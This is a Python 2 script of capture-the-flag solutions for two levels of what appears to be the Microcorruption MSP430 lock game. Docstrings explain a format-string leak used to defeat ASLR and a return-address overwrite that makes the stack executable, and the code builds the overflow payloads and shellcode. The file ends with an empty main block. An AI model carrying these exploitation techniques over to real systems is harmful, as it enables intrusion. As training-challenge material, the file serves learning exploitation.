import sys
import struct



def vladivostok(new_printf):

    """
    This level introduces ASLR (address space layout randomization). The main function calls rand() to obtain a random number that is used to
    relocate the base of the stack and code regions. Thus we cannot have hard-coded addresses in our exploit as the relocation would break that.
    
    To solve this, we first observe that we must enter a user name and a password in succession and the user-name is printed just before asking for the 
    password. We can also observe that a format-string attacks exists at the call for the username and a buffer-overflow exists with the password call.
    What we really need is some indicator that tells us what the relocated address would be, and the format-string attack does just that. 
    
    By injecting "%x%x" into the username, we read the top two elements on the program's stack. This reveals a certain address, which upon closer 
    inspection is found to be the address of the printf function. Looking through the code we see that there is a function located at 0x48ec, which 
    calls the unlock module, when passed with the correct parameter. Thus all we need is the relocated address of this function, which can be obtained 
    by getting its offset from printf's base address before relocation and adding it to printf's relocated address.
    """

    old_printf = 0x476a
    old_unlock = 0x48ec
    diff = old_unlock - old_printf
    new_unlock = new_printf + diff
    payload = "A" * 8
    payload += struct.pack('<H', new_unlock)
    payload += struct.pack('<H', 0x0000)
    payload += struct.pack('<H',0x007f)
    
    print payload.encode('hex')
    

def bangalore():
    
    """
    This level has a function that demarcates the pages as W^X (either writeable or executable but not both). Thus the pages of memory containing the
    stack are made writeable (and non-executable), while the code pages are executable. There is a stack overflow which we can exploit as follows.
    
    We first overwrite the return address to point to the interrupt that enables W^X and setup the stack in such a way that we provide parameters for 
    making that page of the stack(where we injected the shellcode) executable. Once we return from this region of code, control comes back to the stack
    where we place the address of our shellcode (which in this case is placed right after). 
    
    This is our shellcode
        sub 0x0f, sp
        mov 0xff00, sr
        call 0x10
    """
    
    shellcode = struct.pack('<H', 0x8031)
    shellcode += struct.pack('<H', 0x000f)
    shellcode += struct.pack('<H', 0x4032)
    shellcode += struct.pack('<H', 0xff00)
    shellcode += struct.pack('<H', 0x12b0)
    shellcode += struct.pack('<H', 0x0010)
    
    #   16 bytes of junk to fill up the stack
    payload = 'A' * 16
    
    #   overwrite return address to just before the call instruction in the page_executable function
    payload += struct.pack('<H', 0x44be)
    #   until this point the stack pages can be writeable. Beyond this we need an executable stack
    write_size = len(payload)
 
    #   setup the stack for the interrupt that enables page execution
    #   the 12 bytes of zeroes here offset the add 0xA, sp instruction
    payload += struct.pack('<H', 0x0000)
    payload += struct.pack('<H', 0x0000)
    payload += struct.pack('<H', 0x0000)
    #   this is the page number we want to make executable
    payload += struct.pack('<H', 0x0040)
    #   this is the second argument it expects
    payload += struct.pack('<H', 0x0000)
    
    size = len(payload)
    #   calculate the new address where we want to jump 
    addr = 0x4000 + size - write_size + 2
   
    #   inject shellcode at this new address
    #   since pages are W^X, make sure that the stack pointer is moved back to a writeable page (0x3f)
    #   so that the call instruction, which implicitly pushes the return address does not throw a segfault
    payload += struct.pack('<H',int(hex(addr),16))
    payload += shellcode
    
  
    
    print payload.encode('hex')


if __name__ == "__main__":
   # call the appropriate challenge here